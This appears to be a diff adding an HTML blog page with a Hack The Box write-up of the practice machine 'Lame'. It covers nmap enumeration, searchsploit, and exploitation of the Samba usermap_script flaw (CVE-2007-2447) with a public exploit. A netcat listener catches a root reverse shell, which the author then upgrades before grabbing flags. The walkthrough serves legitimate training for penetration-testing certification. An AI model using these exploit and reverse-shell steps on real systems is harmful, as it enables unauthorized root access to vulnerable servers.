@@ -1,0 +1,175 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Lame.htb Writeup | Kevin Thompson</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/github-dark.min.css" id="code-theme">
+  <style>
+    :root {
+      --bg: #0f1117;
+      --text: #e4e4e4;
+      --primary: #4299e1;
+    }
+    body.light {
+      --bg: #ffffff;
+      --text: #1a202c;
+    }
+    body {
+      background: var(--bg);
+      color: var(--text);
+      font-family: 'Inter', sans-serif;
+      padding: 2rem;
+      line-height: 1.7;
+      transition: background 0.3s, color 0.3s;
+    }
+    a {
+      color: var(--primary);
+      text-decoration: none;
+    }
+    a:hover {
+      text-decoration: underline;
+    }
+    .back {
+      margin-bottom: 2rem;
+    }
+    pre {
+      background: #1e1e1e;
+      padding: 1rem;
+      border-radius: 8px;
+      overflow-x: auto;
+    }
+    code {
+      font-family: Consolas, Monaco, monospace;
+    }
+    h1, h2 {
+      margin-top: 2rem;
+      color: var(--primary);
+    }
+    button.toggle-btn {
+      position: fixed;
+      top: 1rem;
+      right: 1rem;
+      background: none;
+      color: var(--text);
+      border: 2px solid var(--text);
+      border-radius: 6px;
+      padding: 0.4rem 0.8rem;
+      cursor: pointer;
+    }
+    .screenshot {
+      display: block;
+      max-width: 100%;
+      margin: 1rem auto;
+      border-radius: 8px;
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.3);
+    }
+  </style>
+</head>
+<body>
+  <button class="toggle-btn" onclick="toggleMode()">Toggle Mode</button>
+  <div class="back"><a href="index.html#htb">← Back to Writeups</a></div>
+
+  <h1>lame.htb</h1>
+  <img src="lameimages/lamelogo.png" alt="Lame Logo" class="screenshot">
+
+  <h2>Overview</h2>
+  <p>Welcome to the lame write up. This is an "easy" box, but it is a box for great learning and it is on the list of OSCP like boxes. There are numerous ways to solve this box, as it is full of vulnerabilities. There is also a bunch of Metasploit modules that just one click root it. Because I'm studying for my OSCP, I wanted to make sure I avoided using Metasploit.</p>
+
+  <h2>Initial Enumeration</h2>
+  <p>First let’s ping the machine to make sure it is online, I like using fping.</p>
+  <pre><code class="language-bash">fping 10.10.10.3</code></pre>
+  <img src="lameimages/fping.png" alt="Fping Result" class="screenshot">
+  <p>Alright, now I know the machine is online.</p>
+
+  <p>I’m going to nmap it to know what services and versions are running. This is my favorite nmap command I like to start with. Nmap generally scans only the first 1000 by default and on a few boxes that has delayed me hours because I thought I was seeing the full picture, but I wasn’t. The sV attempts to determine the version of the service running on port. The sS does a TCP SYN port scan, which is the default anyway, but whatever. The T4 is the speed, T4 is fast, but not insane that it will miss stuff. The oX outputs the scan to a xml file as well as displaying it on the screen. I like to do this because I use pentest.ws, it allows you to upload xml files and displays it in a super great format.</p>
+  <pre><code class="language-bash">nmap -p 1-65535 -sV -sS -T4 10.10.10.3 -oX lame.xml</code></pre>
+  <img src="lameimages/nmap1.png" alt="Nmap 1" class="screenshot">
+  <img src="lameimages/nmap2.png" alt="Nmap 2" class="screenshot">
+  <img src="lameimages/ports.png" alt="Open Ports" class="screenshot">
+
+  <p>Here are the ports, services, and versions that our nmap scan was able to pick up. I next started at the top and began to work my way down. Looking at the versions and then using Google to find known vulnerabilities or exploits that I could use.</p>
+  <p><strong>Vsftpd 2.3.4</strong></p>
+  <p>I began to search around and found this, super fascinating write up on how to use a known backdoor in this version. Long story short, you telnet in, but use a ‘:)’ at the end of the username and it “holds the door open” and let’s you get a shell. It ended up not working for this specific box, but thought it was an interesting write up nonetheless.</p>
+  <p>I moved on to <strong>OpenSSH 4.7p1</strong>.</p>
+  <p>Upon researching this version of Openssh, there wasn’t anything super vulnerable about it. So I kept moving on down the list.</p>
+
+  <h2>Samba Exploitation</h2>
+  <p><strong>Samba smbd 3.X - 4.X</strong></p>
+  <p>Kali has searchsploit preinstalled (you have to manually install it if you are using ParrotOS), so I wanted to see if there was anything known about this version.</p>
+  <pre><code class="language-bash">searchsploit Samba 3.0</code></pre>
+  <img src="lameimages/searchsploit.png" alt="Searchsploit Output" class="screenshot">
+  <p>I began to work down the list and look into these. The third one down looked super promising.</p>
+  <pre><code class="language-bash">cat /usr/share/exploitdb/exploits/unix/remote/16320.rb | grep CVE</code></pre>
+  <img src="lameimages/ruby.png" alt="Ruby CVE Output" class="screenshot">
+
+  <p>Then I moved to Google to check out CVE-2007-2447.</p>
+  <img src="lameimages/google.png" alt="Google Result 1" class="screenshot">
+  <img src="lameimages/google2.png" alt="Google Result 2" class="screenshot">
+  <img src="lameimages/google3.png" alt="Google Result 3" class="screenshot">
+  <img src="lameimages/cve-2007.png" alt="CVE-2007 Summary" class="screenshot">
+
+  <p>This exploit looked super promising. What it does is it takes advantage of unfiltered user input provided via MS-RPC calls to /bin/sh when invoking non-default "username map script" configuration. So no authentication is needed to exploit this vulnerability. It is supposed to just spit back a root shell.</p>
+  <p>The root cause is passing unfiltered user input provided via MS-RPC calls to /bin/sh when invoking non-default "username map script" configuration option in smb.conf, so no authentication is needed to exploit this vulnerability. For more info about this exploit, see this link: <a href="https://amriunix.com/post/cve-2007-2447-samba-usermap-script/">amriunix.com</a></p>
+  <p>It got a CVSS score of 6.0 — <a href="https://www.cvedetails.com/cve/CVE-2007-2447/">CVE Details</a></p>
+
+  <h2>Exploit Setup</h2>
+  <p>I gave it a try. I cloned the repo to my machine.</p>
+  <pre><code class="language-bash">git clone https://github.com/amriunix/CVE-2007-2447.git</code></pre>
+  <img src="lameimages/gitclone.png" alt="Git Clone CVE" class="screenshot">
+
+  <p>Reading through the documentation, I needed to set some things up before I could launch it.</p>
+  <pre><code class="language-bash">sudo apt install python3-pip -y
+pip install pysmb</code></pre>
+  <img src="lameimages/pythonpip.png" alt="Python Pip Install" class="screenshot">
+  <img src="lameimages/pysmb.png" alt="Pysmb Install" class="screenshot">
+
+  <h2>Listener Setup</h2>
+  <p>I was then ready to give it a go.</p>
+  <p>I started my nc listening on port 1234. The l is for listen, v for verbose, n for suppress name/port resolutions, and p for what port.</p>
+  <pre><code class="language-bash">nc -lvnp 1234</code></pre>
+  <img src="lameimages/nc.png" alt="Netcat Listener" class="screenshot">
+
+  <h2>Exploit Execution</h2>
+  <p>This is the command I use to run the exploit.</p>
+  <pre><code class="language-bash">python3 usermap_script.py 10.10.10.3 139 10.10.14.3 1234</code></pre>
+  <p>I hit enter and on my other terminal window I see the connection being received. I type <code>id</code> to see what permissions/user I caught.</p>
+
+  <h2>Post Exploitation</h2>
+  <pre><code class="language-bash">id
+python --version</code></pre>
+  <img src="lameimages/pythonv.png" alt="Python Version Check" class="screenshot">
+  <p>I can upgrade that shell.</p>
+  <pre><code class="language-bash">python -c 'import pty; pty.spawn("/bin/bash")'</code></pre>
+  <img src="lameimages/shell.png" alt="Shell Access" class="screenshot">
+  <img src="lameimages/upgrade.png" alt="Shell Upgrade" class="screenshot">
+
+  <h2>Flag Collection</h2>
+  <p>Great, so I ran a little script to grab all the flags for me.</p>
+  <pre><code class="language-bash">find . -name user.txt -exec wc -c {} \; -exec cat {} \; && \
+find . -name root.txt -exec wc -c {} \; -exec cat {} \;</code></pre>
+  <img src="lameimages/grabflags.png" alt="Grab Flags" class="screenshot">
+
+  <h2>Cleanup & Remediation</h2>
+  <p>For cleanup, there isn’t much, I didn’t leave any files on the machine. Just exploited a vulnerability and ran a few commands.</p>
+  <p>For remediation they really just need to patch this box. This is only one way to exploit it, but there are many other ways. And techniques.</p>
+  <p><em>- ktt</em></p>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+  <script>hljs.highlightAll();</script>
+  <script>
+    if (localStorage.getItem('theme') === 'light') {
+      document.body.classList.add('light');
+      document.getElementById('code-theme').href = 'https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/github.min.css';
+    }
+    function toggleMode() {
+      document.body.classList.toggle('light');
+      const newTheme = document.body.classList.contains('light') ? 'light' : 'dark';
+      localStorage.setItem('theme', newTheme);
+      document.getElementById('code-theme').href = newTheme === 'light'
+        ? 'https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/github.min.css'
+        : 'https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/github-dark.min.css';
+    }
+  </script>
+</body>
+</html>
